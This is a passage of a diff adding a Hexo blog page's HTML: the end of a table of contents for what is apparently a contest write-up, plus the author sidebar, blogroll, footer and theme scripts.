class="nav-link" href="#%E6%B2%A1%E6%9C%89-BUG-%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F"><span class="nav-number">18.</span> <span class="nav-text">没有 BUG 的教务系统</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="nav-number">18.1.</span> <span class="nav-text">第一题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AF%94%E8%B5%9B%E6%97%B6%E9%97%B4%E5%86%85%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84%E9%A2%98"><span class="nav-number">19.</span> <span class="nav-text">比赛时间内未完成的题</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xhy"
+      src="/assets/img/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xhy</p>
+  <div class="site-description" itemprop="description">南冥有熊也 (XhyEax)</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">150</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://xhyeax.cn/" title="生活博客 → https:&#x2F;&#x2F;xhyeax.cn" rel="noopener" target="_blank"><i class="fa fa-user fa-fw"></i>生活博客</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/XhyEax" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;XhyEax" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:me@xhyeax.com" title="E-Mail → mailto:me@xhyeax.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.0x002.com/" title="https:&#x2F;&#x2F;www.0x002.com" rel="noopener" target="_blank">Yunen's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.cyyself.name/" title="https:&#x2F;&#x2F;blog.cyyself.name" rel="noopener" target="_blank">cyyself's Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xhy</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
